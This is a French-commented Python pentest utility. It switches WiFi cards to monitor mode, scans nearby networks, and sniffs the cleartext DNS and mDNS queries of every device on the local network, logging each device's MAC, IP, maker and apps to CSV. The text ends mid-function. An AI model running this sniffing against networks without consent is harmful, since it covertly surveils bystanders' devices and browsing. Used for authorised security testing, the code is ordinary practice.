#!/usr/bin/env python3
"""
Outil de Pentest Interactif
Nécessite: pip install rich paramiko pyperclip scapy
"""

import subprocess
import socket
import re
import csv
import os
import sys
import signal
import atexit
from pathlib import Path
from typing import List, Dict, Optional, Tuple
import pyperclip
import threading
import time

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box
from rich.style import Style
from rich.color import Color
from rich.theme import Theme
from rich.columns import Columns

# Configuration des couleurs du thème (dégradé rouge-blanc-orange)
custom_theme = Theme({
    "info": "white",
    "warning": "orange1",
    "error": "red",
    "success": "green",
    "title": "bold red",
    "subtitle": "orange1",
})

console = Console(theme=custom_theme)


# ═══════════════════════════════════════════════════════════════════════════
# GESTIONNAIRE DE NETTOYAGE GLOBAL
# ═══════════════════════════════════════════════════════════════════════════

class CleanupManager:
    """Gère le nettoyage propre à la sortie du programme"""
    
    def __init__(self):
        self.monitor_interfaces = []  # Interfaces en mode monitor à nettoyer
        self.child_processes = []      # Sous-processus à tuer
        self.temp_files = []           # Fichiers temporaires à supprimer
        self.cleanup_hooks = []        # Fonctions de nettoyage custom
        
    def register_monitor_interface(self, iface: str):
        """Enregistre une interface en mode monitor"""
        if iface and iface not in self.monitor_interfaces:
            self.monitor_interfaces.append(iface)
    
    def register_process(self, proc):
        """Enregistre un sous-processus à tuer"""
        if proc and proc not in self.child_processes:
            self.child_processes.append(proc)
    
    def register_temp_file(self, filepath: str):
        """Enregistre un fichier temporaire"""
        if filepath and filepath not in self.temp_files:
            self.temp_files.append(filepath)
    
    def register_hook(self, func):
        """Enregistre une fonction de nettoyage personnalisée"""
        if func and func not in self.cleanup_hooks:
            self.cleanup_hooks.append(func)
    
    def cleanup(self):
        """Effectue le nettoyage complet"""
        # 1. Tuer les sous-processus
        for proc in self.child_processes:
            try:
                if proc.poll() is None:  # Si encore en vie
                    proc.terminate()
                    proc.wait(timeout=2)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        
        # 2. Tuer les processus connus par nom
        for proc_name in ['airodump-ng', 'aireplay-ng', 'hostapd', 'dnsmasq']:
            try:
                subprocess.run(['sudo', 'pkill', '-9', '-f', proc_name],
                              capture_output=True, timeout=2)
            except Exception:
                pass
        
        # 3. Restaurer les interfaces monitor
        for iface in self.monitor_interfaces:
            try:
                # Arrêter airmon-ng
                subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
                              capture_output=True, timeout=3)
            except Exception:
                pass
        
        # 4. Redémarrer NetworkManager
        if self.monitor_interfaces:
            try:
                subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                              capture_output=True, timeout=5)
            except Exception:
                pass
        
        # 5. Supprimer les fichiers temporaires
        for filepath in self.temp_files:
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except Exception:
                pass
        
        # 6. Exécuter les hooks custom
        for hook in self.cleanup_hooks:
            try:
                hook()
            except Exception:
                pass

# Instance globale du gestionnaire
cleanup_manager = CleanupManager()


def signal_handler(signum, frame):
    """Handler pour SIGINT (Ctrl+C) et SIGTERM"""
    console.print("\n[warning]⚠ Signal reçu, nettoyage en cours...[/warning]")
    cleanup_manager.cleanup()
    console.print("[success]✓ Nettoyage terminé[/success]")
    sys.exit(0)


def atexit_handler():
    """Handler appelé automatiquement à la sortie"""
    cleanup_manager.cleanup()


# Enregistrer les handlers
signal.signal(signal.SIGINT, signal_handler)   # Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # kill
atexit.register(atexit_handler)                # Exit normal


# ASCII Art du crâne - PARTIE 1 (pour interfaces)
SKULL_PART1 = r"""   / \           / \
  /   \         / . \
  | .  \       /  . |
  | .   |     |  .. |
  | ..  | _._ |  .. |
   \..  ./   \.  .. |
    \. | xxxxx |  ./
     \/ x ,-. x\__/
   .--| ,-'ZZZ`-.  \--.
   (  ,'ZZ;ZZ;Z;Z`..  )
   .,'ZZ;; ;; ; ;ZZ `.."""

# ASCII Art du crâne - PARTIE 2 (pour menu)
SKULL_PART2 = r"""      ._###ZZ @  .  @  Z####`
       ````Z._  ~~~  _.Z``\
        _/ ZZ `-----'  Z   \
       ;   ZZ /.....\  Z    \;;
      ;/__ ZZ/..  ...\ Z     \;
      ##'#.\_/.      _.\ZZ    |
      ##....../      |..\Z    |;
      / `-.___/      |../Z    |
      |    ZZ |      |./  Z   |;;"""


class OUILookup:
    """Recherche de fabricants via l'adresse MAC (fichier oui.txt)"""
    
    oui_database = {}
    
    @classmethod
    def load_oui_file(cls, filepath: str = "oui.txt"):
        """Charge le fichier OUI"""
        if cls.oui_database:  # Déjà chargé
            return
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    # Format: XX-XX-XX   (hex)		Manufacturer Name
                    match = re.match(r'^([0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2})\s+\(hex\)\s+(.+)$', line.strip())
                    if match:
                        mac_prefix = match.group(1).replace('-', ':').lower()
                        manufacturer = match.group(2).strip()
                        cls.oui_database[mac_prefix] = manufacturer
            console.print(f"[success]✓ {len(cls.oui_database)} fabricants chargés depuis oui.txt[/success]")
        except FileNotFoundError:
            console.print("[warning]⚠ Fichier oui.txt non trouvé. Identification des fabricants désactivée.[/warning]")
        except Exception as e:
            console.print(f"[warning]Erreur lors du chargement de oui.txt: {e}[/warning]")
    
    @classmethod
    def lookup(cls, mac_address: str) -> Optional[str]:
        """Recherche le fabricant à partir d'une adresse MAC"""
        if not cls.oui_database:
            cls.load_oui_file()
        
        if not mac_address or not cls.oui_database:
            return None
        
        # Normaliser l'adresse MAC
        mac_prefix = ':'.join(mac_address.replace('-', ':').replace('.', ':').split(':')[:3]).lower()
        
        return cls.oui_database.get(mac_prefix, None)


class DNSMonitor:
    """Moniteur de requêtes DNS avec Scapy en mode monitor WiFi"""
    
    def __init__(self):
        self.dns_queries = []
        self.monitoring = False
        self.monitor_thread = None
        self.original_mode = None
        self.monitor_interface = None
        self.original_interface = None
    
    def get_wifi_interfaces(self) -> List[str]:
        """Récupère les interfaces WiFi disponibles"""
        wifi_interfaces = []
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.split()[1]
                    wifi_interfaces.append(iface)
        except Exception as e:
            console.print(f"[error]Erreur lors de la récupération des interfaces WiFi: {e}[/error]")
        return wifi_interfaces
    
    def create_recovery_script(self, interface: str):
        """Crée le script de récupération WiFi"""
        script_content = f"""#!/bin/bash
# Script de récupération d'urgence pour restaurer le WiFi
# Usage: sudo ./wifi_recovery.sh [interface]
set -e
iface="${{1:-{interface}}}"
echo "╔════════════════════════════════════════════════════════╗"
echo "║     SCRIPT DE RÉCUPÉRATION WiFi D'URGENCE             ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
echo "[1/8] Arrêt de tous les processus réseau..."
sudo pkill -9 -f airodump-ng 2>/dev/null || true
sudo pkill -9 -f aireplay-ng 2>/dev/null || true
sudo pkill -9 -f wpa_supplicant 2>/dev/null || true
sudo pkill -9 -f dhclient 2>/dev/null || true
sleep 2
echo "[2/8] Arrêt de NetworkManager..."
sudo systemctl stop NetworkManager
sleep 2
echo "[3/8] Désactivation de l'interface $iface..."
sudo ip link set $iface down
sleep 2
echo "[4/8] Suppression de la configuration rfkill..."
sudo rfkill unblock wifi 2>/dev/null || true
sleep 1
echo "[5/8] Passage en mode managed..."
sudo iw $iface set type managed
sleep 2
echo "[6/8] Réactivation de l'interface..."
sudo ip link set $iface up
sleep 2
echo "[7/8] Redémarrage de NetworkManager..."
sudo systemctl restart NetworkManager
sleep 3
echo "[8/8] Tentative de reconnexion..."
nmcli device connect $iface 2>/dev/null || true
sleep 2
echo ""
echo "═══════════════════════════════════════════════════════"
echo "Vérification de l'état de l'interface:"
echo "═══════════════════════════════════════════════════════"
iwconfig $iface 2>/dev/null || echo "Erreur: impossible d'obtenir les infos iwconfig"
echo ""
ip link show $iface 2>/dev/null || echo "Erreur: impossible d'obtenir les infos ip link"
echo ""
nmcli device status | grep $iface || echo "Erreur: interface non trouvée dans nmcli"
echo ""
# Vérifier si on est en mode managed
if iwconfig $iface 2>/dev/null | grep -q "Mode:Managed\\|Mode:Auto"; then
    echo "✓ SUCCESS: Interface $iface est maintenant en mode Managed"
    echo ""
    echo "Si le WiFi ne se connecte pas automatiquement, essayez:"
    echo "  nmcli device wifi list"
    echo "  nmcli device wifi connect <SSID> password <mot_de_passe>"
else
    echo "✗ ÉCHEC: L'interface n'est pas en mode Managed"
    echo ""
    echo "Actions manuelles recommandées:"
    echo "  1. Redémarrer le système: sudo reboot"
    echo "  2. Ou réinitialiser le module WiFi:"
    echo "     sudo modprobe -r $(lspci -k | grep -A 3 'Network controller' | grep 'Kernel driver' | awk '{{print $5}}')"
    echo "     sudo modprobe $(lspci -k | grep -A 3 'Network controller' | grep 'Kernel driver' | awk '{{print $5}}')"
fi
echo ""
echo "═══════════════════════════════════════════════════════"
"""
        try:
            with open('wifi_recovery.sh', 'w') as f:
                f.write(script_content)
            subprocess.run(['chmod', '+x', 'wifi_recovery.sh'], check=True)
            console.print("[success]✓ Script de récupération créé: wifi_recovery.sh[/success]")
        except Exception as e:
            console.print(f"[warning]Impossible de créer le script de récupération: {e}[/warning]")
    
    def enable_monitor_mode(self, interface: str) -> Optional[str]:
        """Active le mode monitor sur une interface WiFi"""
        try:
            self.original_interface = interface
            
            console.print(f"\n[warning]🔧 Activation du mode monitor sur {interface}...[/warning]")
            
            # Méthode 1: Via iw (plus fiable que airmon-ng)
            console.print("[info]Étape 1/5: Arrêt de NetworkManager...[/info]")
            subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'], 
                         capture_output=True)
            time.sleep(1)
            
            console.print("[info]Étape 2/5: Désactivation de l'interface...[/info]")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                         capture_output=True)
            time.sleep(1)
            
            console.print("[info]Étape 3/5: Passage en mode monitor...[/info]")
            result = subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'none'], 
                                  capture_output=True, text=True)
            
            if result.returncode != 0:
                console.print(f"[warning]iw a échoué, tentative avec airmon-ng...[/warning]")
                
                # Tuer les processus qui interfèrent
                subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                             capture_output=True)
                
                # Utiliser airmon-ng
                result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                                      capture_output=True, text=True)
                
                # Chercher le nom de l'interface monitor
                monitor_iface = None
                for line in result.stdout.split('\n'):
                    if 'monitor mode' in line.lower() and 'enabled' in line.lower():
                        match = re.search(r'on (\S+)', line)
                        if match:
                            monitor_iface = match.group(1)
                
                if not monitor_iface:
                    monitor_iface = interface + 'mon'
                
                interface = monitor_iface
            
            console.print("[info]Étape 4/5: Réactivation de l'interface...[/info]")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                         capture_output=True)
            time.sleep(1)
            
            console.print("[info]Étape 5/5: Vérification...[/info]")
            # Vérifier que l'interface existe et est en mode monitor
            verify = subprocess.run(['iwconfig', interface], 
                                  capture_output=True, text=True)
            
            if verify.returncode == 0 and 'Mode:Monitor' in verify.stdout:
                console.print(f"[success]✓ Mode monitor activé sur {interface}[/success]")
                self.monitor_interface = interface
                
                # Créer le script de récupération
                self.create_recovery_script(self.original_interface)
                
                return interface
            else:
                console.print(f"[error]L'interface {interface} n'est pas en mode monitor[/error]")
                console.print("[error]Sortie iwconfig:[/error]")
                console.print(verify.stdout)
                return None
                
        except FileNotFoundError as e:
            console.print(f"[error]Commande non trouvée: {e}[/error]")
            console.print("[error]Assurez-vous que iw et/ou aircrack-ng sont installés[/error]")
            return None
        except Exception as e:
            console.print(f"[error]Erreur lors de l'activation du mode monitor: {e}[/error]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            return None
    
    def disable_monitor_mode(self, interface: str = None):
        """Désactive le mode monitor et restaure le WiFi"""
        try:
            if not interface:
                interface = self.original_interface or 'wlo1'
            
            console.print(f"\n[warning]🔧 Restauration du WiFi sur {interface}...[/warning]")
            
            # Si on a une interface monitor différente, la nettoyer d'abord
            if self.monitor_interface and self.monitor_interface != interface:
                console.print(f"[info]Nettoyage de {self.monitor_interface}...[/info]")
                subprocess.run(['sudo', 'ip', 'link', 'set', self.monitor_interface, 'down'], 
                             capture_output=True)
                subprocess.run(['sudo', 'iw', self.monitor_interface, 'set', 'type', 'managed'], 
                             capture_output=True)
            
            # Restaurer l'interface principale
            console.print("[info]Étape 1/5: Désactivation de l'interface...[/info]")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                         capture_output=True)
            time.sleep(1)
            
            console.print("[info]Étape 2/5: Passage en mode managed...[/info]")
            subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'], 
                         capture_output=True)
            time.sleep(1)
            
            console.print("[info]Étape 3/5: Réactivation de l'interface...[/info]")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                         capture_output=True)
            time.sleep(1)
            
            console.print("[info]Étape 4/5: Redémarrage de NetworkManager...[/info]")
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                         capture_output=True)
            time.sleep(3)
            
            console.print("[info]Étape 5/5: Reconnexion...[/info]")
            subprocess.run(['nmcli', 'device', 'connect', interface], 
                         capture_output=True)
            time.sleep(2)
            
            console.print("[success]✓ WiFi restauré[/success]")
            console.print("\n[info]Si le WiFi ne fonctionne pas, exécutez: sudo ./wifi_recovery.sh[/info]")
            
        except Exception as e:
            console.print(f"[error]Erreur lors de la restauration: {e}[/error]")
            console.print("\n[warning]⚠ IMPORTANT: Exécutez le script de récupération:[/warning]")
            console.print("[warning]sudo ./wifi_recovery.sh[/warning]")
    
    def start_monitoring(self, interface: str = None, duration: int = 60, all_networks: bool = True):
        """Démarre le monitoring DNS en mode managed sur le réseau local (UDP port 53)"""
        try:
            from scapy.all import sniff, DNS, DNSQR, IP, UDP, Ether, conf
            
            # Désactiver les warnings Scapy
            conf.verb = 0

            if not interface:
                wifi_ifaces = self.get_wifi_interfaces()
                if not wifi_ifaces:
                    console.print("[error]Aucune interface WiFi trouvée[/error]")
                    return
                interface = wifi_ifaces[0]

            self.monitoring = True
            self.dns_queries = []

            console.print(f"\n[warning]🔍 Capture DNS sur {interface} pendant {duration} secondes...[/warning]")
            console.print("[info]📡 Écoute du trafic DNS en clair (UDP port 53) sur le réseau local[/info]")
            console.print("[info]🎯 Tous les appareils du réseau utilisant DNS non chiffré seront capturés[/info]")
            console.print("[info]Appuyez sur Ctrl+C pour arrêter plus tôt[/info]\n")

            device_macs = {}
            packet_count = 0
            dns_count = 0
            # Dédup affichage live : (src_ip, query) → last_seen timestamp
            _live_dedup = {}

            # Table de fingerprinting basique : domaine partiel → label appareil
            _FINGERPRINTS = {
                'tiktok': '📱 TikTok',
                'bytedance': '📱 TikTok/ByteDance',
                'tiktokcdn': '📱 TikTok CDN',
                'tiktokv': '📱 TikTok',
                'apple.com': '🍎 Apple',
                'icloud': '🍎 iCloud',
                'iphone-ld': '🍎 iPhone',
                'mzstatic': '🍎 App Store',
                'google.com': '🔍 Google',
                'googleapis': '🔍 Google APIs',
                'gstatic': '🔍 Google Static',
                'youtube': '▶️  YouTube',
                'netflix': '🎬 Netflix',
                'spotify': '🎵 Spotify',
                'facebook': '👤 Facebook',
                'instagram': '📸 Instagram',
                'whatsapp': '💬 WhatsApp',
                'snapchat': '👻 Snapchat',
                'twitter': '🐦 Twitter/X',
                'twitch': '🎮 Twitch',
                'discord': '💬 Discord',
                'microsoft': '🪟 Microsoft',
                'xbox': '🎮 Xbox',
                'nintendo': '🎮 Nintendo',
                'steam': '🎮 Steam',
                'akamai': '☁️  Akamai CDN',
                'cloudfront': '☁️  CloudFront',
                'fastly': '☁️  Fastly CDN',
                'cdn77': '☁️  CDN77',
                'oculus': '🥽 Meta/Oculus',
                'oculusal': '🥽 Meta/Oculus',
                'hue': '💡 Philips Hue',
                'nanoleaf': '💡 Nanoleaf',
                'wled': '💡 WLED',
                'aura': '💡 ASUS Aura',
                'srgbmods': '💡 sRGBmods',
                'amazon': '🛒 Amazon',
                'amazonaws': '☁️  AWS',
            }

            def _fingerprint(domain: str) -> str:
                d = domain.lower()
                for key, label in _FINGERPRINTS.items():
                    if key in d:
                        return label
                return ''

            # MAC randomisée (bit local) → hint OS
            def _mac_hint(mac: str) -> str:
                if mac == "Unknown":
                    return ""
                try:
                    first_byte = int(mac.split(':')[0], 16)
                    if first_byte & 0x02:  # bit locally administered
                        return "[dim](MAC rand.)[/dim]"
                except Exception:
                    pass
                return ""

            def packet_handler(packet):
                nonlocal packet_count, dns_count
                packet_count += 1

                try:
                    if not packet.haslayer(DNSQR):
                        return
                    if not packet.haslayer(DNS):
                        return
                    
                    # FILTRER les réponses DNS - on veut UNIQUEMENT les requêtes
                    is_resp = packet[DNS].qr == 1
                    if is_resp:
                        return  # Ignorer les réponses (serveurs DNS qui répondent)

                    dns_count += 1
                    query = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')

                    src_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"
                    dst_ip = packet[IP].dst if packet.haslayer(IP) else "Unknown"
                    src_mac = packet[Ether].src if packet.haslayer(Ether) else "Unknown"

                    # Déterminer le protocole
                    from scapy.all import UDP, TCP
                    is_mdns = packet.haslayer(UDP) and packet[UDP].dport == 5353
                    is_tcp  = packet.haslayer(TCP) and (packet[TCP].dport == 53 or packet[TCP].sport == 53)
                    
                    if is_mdns:
                        proto_label = "[dim]mDNS[/dim]"
                    elif is_tcp:
                        proto_label = "[cyan]DNS/T[/cyan]"
                    else:
                        proto_label = "[orange1]DNS  [/orange1]"

                    manufacturer = OUILookup.lookup(src_mac) if src_mac != "Unknown" else None

                    # Tracker les appareils
                    if src_mac != "Unknown":
                        if src_mac not in device_macs:
                            device_macs[src_mac] = {
                                'manufacturer': manufacturer,
                                'ips': set(),
                                'queries': 0
                            }
                        if src_ip != "Unknown":
                            device_macs[src_mac]['ips'].add(src_ip)
                        device_macs[src_mac]['queries'] += 1

                    self.dns_queries.append({
                        'time': time.strftime('%H:%M:%S'),
                        'source_mac': src_mac,
                        'source_ip': src_ip,
                        'dest_ip': dst_ip,
                        'bssid': 'N/A',
                        'query': query,
                        'manufacturer': manufacturer or "Inconnu",
                        'type': packet[DNSQR].qtype
                    })

                    # Dédup live : même (ip, query) dans la même seconde = une seule ligne
                    dedup_key = (src_ip, query)
                    now_ts = time.strftime('%H:%M:%S')
                    if _live_dedup.get(dedup_key) == now_ts:
                        return  # déjà affiché cette seconde
                    _live_dedup[dedup_key] = now_ts
                    if len(_live_dedup) > 500:
                        _live_dedup.clear()

                    # Identification : fabricant OUI (texte brut pour padding correct)
                    fp = _fingerprint(query)
                    mac_hint = _mac_hint(src_mac)

                    # Construire le label d'identification en texte pur (sans balises Rich)
                    # pour que le padding soit exact, puis l'envelopper dans la couleur
                    if manufacturer:
                        id_plain = f"[{manufacturer[:18]}]"
                        id_text  = f"[green]{id_plain:<22}[/green]"
                    else:
                        id_plain = f"[{src_mac[:11]}…]"
                        id_text  = f"[dim]{id_plain:<22}[/dim]"

                    # Affichage simplifié sans émojis
                    console.print(
                        f"[dim white]{now_ts}[/dim white] "
                        f"{proto_label} "
                        f"{id_text} "
                        f"[orange1]{src_ip:<15}[/orange1] → "
                        f"[white]{query}[/white]"
                    )

                except Exception:
                    pass

            try:
                console.print("[info]Démarrage de la capture (DNS UDP+TCP port 53, mDNS port 5353)...[/info]\n")
                sniff(
                    iface=interface,
                    filter="udp port 53 or tcp port 53 or udp port 5353",
                    prn=packet_handler,
                    timeout=duration,
                    store=False,
                )
            except KeyboardInterrupt:
                console.print("\n[warning]Capture interrompue par l'utilisateur[/warning]")

            self.monitoring = False

            console.print(f"\n[success]✓ Monitoring terminé[/success]")
            console.print(f"[info]Total paquets DNS capturés: {dns_count}[/info]")
            console.print(f"[success]✓ {len(device_macs)} appareil(s) détecté(s)[/success]")

            if self.dns_queries:
                self.display_summary(device_macs)
            else:
                console.print("\n[warning]Aucune requête DNS capturée[/warning]")
                console.print("[info]💡 Raisons possibles:[/info]")
                console.print("[info]  - Les appareils utilisent DNS chiffré (DoH/DoT)[/info]")
                console.print("[info]  - Peu d'activité réseau pendant la capture[/info]")
                console.print("[info]  - Essayez une durée plus longue (300+ secondes)[/info]")

        except ImportError:
            console.print("[error]Scapy n'est pas installé. Installez-le avec: pip install scapy[/error]")
        except PermissionError:
            console.print("[error]Permission refusée. Exécutez le script avec sudo.[/error]")
        except Exception as e:
            console.print(f"[error]Erreur lors du monitoring: {e}[/error]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
        finally:
            self.monitoring = False
    
    def display_summary(self, device_macs: Dict = None):
        """Affiche un résumé des requêtes DNS"""
        if not self.dns_queries:
            return
        
        # Afficher les appareils détectés
        if device_macs:
            console.print("\n[orange1]═══ APPAREILS DÉTECTÉS ═══[/orange1]")
            
            device_table = Table(box=box.ROUNDED, style="white")
            device_table.add_column("MAC", style="orange1", width=17)
            device_table.add_column("Fabricant", style="green", overflow="fold", width=25)
            device_table.add_column("IPs", style="white", overflow="fold", width=30)
            device_table.add_column("Requêtes", style="yellow", justify="right", width=10)
            
            # Trier par nombre de requêtes
            sorted_devices = sorted(device_macs.items(), key=lambda x: x[1]['queries'], reverse=True)
            
            for mac, info in sorted_devices:
                ips_str = ', '.join(list(info['ips'])[:3])
                if len(info['ips']) > 3:
                    ips_str += f" +{len(info['ips'])-3}"
                
                device_table.add_row(
                    mac,
                    info['manufacturer'] or "Inconnu",
                    ips_str or "N/A",
                    str(info['queries'])
                )
            
            console.print(device_table)
        
        # Compter les domaines les plus fréquents
        domain_counts = {}
        for query in self.dns_queries:
            domain = query['query']
            domain_counts[domain] = domain_counts.get(domain, 0) + 1
        
        # Trier par fréquence
        sorted_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:30]
        
        console.print("\n[orange1]═══ TOP 30 DOMAINES ═══[/orange1]")
        
        # Afficher en 2 colonnes
        domain_table = Table(box=box.ROUNDED, style="white", show_header=True)
        domain_table.add_column("Domaine", style="white", overflow="fold", width=50)
        domain_table.add_column("Requêtes", style="orange1", justify="right", width=10)
        
        for domain, count in sorted_domains:
            domain_table.add_row(domain, str(count))
        
        console.print(domain_table)
        
        # Statistiques globales
        sources_ip = set(q['source_ip'] for q in self.dns_queries if q['source_ip'] != 'Unknown')
        sources_mac = set(q['source_mac'] for q in self.dns_queries if q['source_mac'] != 'Unknown')
        bssids = set(q.get('bssid', 'Unknown') for q in self.dns_queries if q.get('bssid') != 'Unknown')
        
        console.print(f"\n[info]Sources MAC uniques: {len(sources_mac)}[/info]")
        console.print(f"[info]Sources IP uniques: {len(sources_ip)}[/info]")
        console.print(f"[info]Points d'accès (BSSID): {len(bssids)}[/info]")
        console.print(f"[info]Domaines uniques: {len(domain_counts)}[/info]")
        
        # Sauvegarder dans un fichier
        filename = f"dns_capture_{time.strftime('%Y%m%d_%H%M%S')}.csv"
        try:
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                fieldnames = ['time', 'source_mac', 'source_ip', 'dest_ip', 'bssid', 'manufacturer', 'query', 'type']
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(self.dns_queries)
            console.print(f"[success]✓ Requêtes sauvegardées dans {filename}[/success]")
        except Exception as e:
            console.print(f"[warning]Erreur lors de la sauvegarde: {e}[/warning]")


class WiFiScanner:
    """Scanner de réseaux WiFi avec nmcli"""
    
    @staticmethod
    def signal_to_bars(signal: int) -> str:
        """Convertit le signal (0-100) en barres visuelles"""
        if signal >= 80:
            return "▓▓▓▓"
        elif signal >= 60:
            return "▓▓▓░"
        elif signal >= 40:
            return "▓▓░░"
        elif signal >= 20:
            return "▓░░░"
        else:
            return "░░░░"
    
    @staticmethod
    def scan_wifi() -> List[Dict]:
        """Scanne les réseaux WiFi disponibles avec iw scan (complet) + nmcli (rapide)"""
        console.print("\n[warning]📡 Scan des réseaux WiFi...[/warning]")
        networks = []
        seen_bssids = set()

        try:
            # Trouver l'interface WiFi principale
            wifi_iface = None
            try:
                iw_r = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
                ifaces = re.findall(r'Interface (\w+)', iw_r.stdout)
                ip_r = subprocess.run(['ip', '-4', 'addr'], capture_output=True, text=True)
                for iface in ifaces:
                    if iface in ip_r.stdout:
                        wifi_iface = iface
                        break
                if not wifi_iface and ifaces:
                    wifi_iface = ifaces[0]
            except Exception:
                pass

            if not wifi_iface:
                console.print("[error]Aucune interface WiFi trouvée[/error]")
                return networks

            # SCAN COMPLET avec iw (pas de limite de 20 réseaux)
            console.print(f"[dim]Scan radio sur {wifi_iface}...[/dim]")
            subprocess.run(['sudo', 'iw', 'dev', wifi_iface, 'scan', 'flush'], 
                         capture_output=True, timeout=5)
            time.sleep(1)
            iw_scan = subprocess.run(['sudo', 'iw', 'dev', wifi_iface, 'scan'],
                                   capture_output=True, text=True, timeout=15)
            
            current_bss = None
            current_ssid = None
            current_signal = 0
            current_freq = 0
            current_chan = ''
            current_security = 'WPA2'
            
            for line in iw_scan.stdout.split('\n'):
                line = line.strip()
                if line.startswith('BSS '):
                    # Sauvegarder le précédent
                    if current_bss:
                        freq_mhz = current_freq
                        band = '5GHz' if freq_mhz >= 3000 else '2.4GHz' if freq_mhz > 0 else ''
                        networks.append({
                            'ssid': current_ssid or '<hidden>',
                            'bssid': current_bss,
                            'signal': current_signal,
                            'bars': WiFiScanner.signal_to_bars(current_signal),
                            'security': current_security,
                            'is_open': current_security == 'Ouvert',
                            'freq': f"{current_freq} MHz" if current_freq else '',
                            'chan': current_chan,
                            'band': band,
                            'manufacturer': OUILookup.lookup(current_bss) or 'Inconnu'
                        })
                        seen_bssids.add(current_bss)
                    
                    # Nouveau BSS
                    current_bss = line.split()[1][:17].upper()
                    if current_bss in seen_bssids:
                        current_bss = None
                        continue
                    current_ssid = None
                    current_signal = 0
                    current_freq = 0
                    current_chan = ''
                    current_security = 'WPA2'
                
                elif current_bss and line.startswith('SSID:') and 'Extended' not in line:
                    current_ssid = line[5:].strip()
                elif current_bss and 'signal:' in line:
                    try:
                        sig_dbm = float(line.split('signal:')[1].split()[0])
                        # Convertir dBm en % (approximation)
                        current_signal = max(0, min(100, int((sig_dbm + 100) * 1.5)))
                    except:
                        pass
                elif current_bss and ('freq:' in line or 'DS Parameter set' in line or 'primary channel' in line):
                    match = re.search(r'(\d{4,5})', line)
                    if match:
                        current_freq = int(match.group(1))
                        # Calculer le canal
                        if 2400 <= current_freq <= 2500:
                            current_chan = str((current_freq - 2407) // 5)
                        elif 5000 <= current_freq <= 6000:
                            current_chan = str((current_freq - 5000) // 5)
                elif current_bss and 'WPA3' in line:
                    current_security = 'WPA3'
                elif current_bss and ('RSN' in line or 'WPA2' in line):
                    if current_security != 'WPA3':
                        current_security = 'WPA2'
                elif current_bss and 'WPA:' in line and 'WPA2' not in line:
                    if current_security not in ('WPA2', 'WPA3'):
                        current_security = 'WPA'
            
            # Dernier BSS
            if current_bss and current_bss not in seen_bssids:
                freq_mhz = current_freq
                band = '5GHz' if freq_mhz >= 3000 else '2.4GHz' if freq_mhz > 0 else ''
                networks.append({
                    'ssid': current_ssid or '<hidden>',
                    'bssid': current_bss,
                    'signal': current_signal,
                    'bars': WiFiScanner.signal_to_bars(current_signal),
                    'security': current_security,
                    'is_open': current_security == 'Ouvert',
                    'freq': f"{current_freq} MHz" if current_freq else '',
                    'chan': current_chan,
                    'band': band,
                    'manufacturer': OUILookup.lookup(current_bss) or 'Inconnu'
                })

            # COMPLÉMENT nmcli (pour avoir les infos de sécurité précises)
            try:
                subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'rescan'],
                             capture_output=True, timeout=5)
                cmd = ['nmcli', '-t', '-f', 'SSID,BSSID,SIGNAL,SECURITY',
                       'device', 'wifi', 'list', 'ifname', wifi_iface]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                
                for line in result.stdout.split('\n'):
                    if not line.strip():
                        continue
                    parts = re.split(r'(?<!\\):', line)
                    if len(parts) < 4:
                        continue
                    bssid = parts[1].replace('\\:', ':').strip().upper()
                    security = parts[3].strip()
                    
                    # Mettre à jour la sécurité si on a déjà ce BSSID
                    for net in networks:
                        if net['bssid'] == bssid and security and security != '--':
                            net['security'] = security
                            net['is_open'] = False
                            break
            except:
                pass  # Si nmcli échoue, on continue avec iw seul

            networks.sort(key=lambda x: x['signal'], reverse=True)
            console.print(f"[success]✓ {len(networks)} réseau(x) unique(s)[/success]")

        except subprocess.TimeoutExpired:
            console.print("[error]Timeout scan WiFi[/error]")
        except Exception as e:
            console.print(f"[error]Erreur: {e}[/error]")

        return networks
    
    @staticmethod
    def display_networks(networks: List[Dict]):
        """Affiche les réseaux WiFi dans un tableau"""
        if not networks:
            console.print("[warning]Aucun réseau trouvé[/warning]")
            return

        table = Table(title="📡 Réseaux WiFi Disponibles",
                      box=box.DOUBLE_EDGE, style="white", header_style="bold red")
        table.add_column("SSID",     style="orange1",    overflow="fold", width=22)
        table.add_column("Signal",   style="white",      justify="center", width=7)
        table.add_column("CH",       style="cyan",       justify="center", width=5)
        table.add_column("Bande",    style="bold white", justify="center", width=7)
        table.add_column("Sécurité", style="white",      justify="center", width=16)
        table.add_column("Fabricant",style="dim white",  overflow="fold",  width=18)
        table.add_column("BSSID",    style="dim white",  width=17)

        for n in networks:
            sec_c = "bold green" if n['is_open'] else "yellow"
            sig   = n['signal']
